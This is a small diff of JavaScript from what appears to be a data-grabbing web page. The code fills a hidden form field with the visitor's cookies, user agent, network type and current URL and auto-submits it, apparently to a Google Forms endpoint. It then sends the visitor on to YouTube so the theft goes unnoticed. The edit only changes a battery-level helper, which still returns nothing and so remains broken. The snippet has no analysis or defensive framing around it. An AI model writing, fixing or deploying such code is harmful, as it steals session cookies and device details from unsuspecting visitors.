@@ -48,7 +48,7 @@ setTimeout(() => window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthA
    function Pj(){
      var X = document.getElementById("2");   
 var un = function(){navigator.getBattery().then(function(bc){return bc * 100 + "%";})};
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${un}`;
+    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${un()}`;
  var Z =document.getElementById("form");
     Z.submit();  
   location.href="https://m.youtube.com";
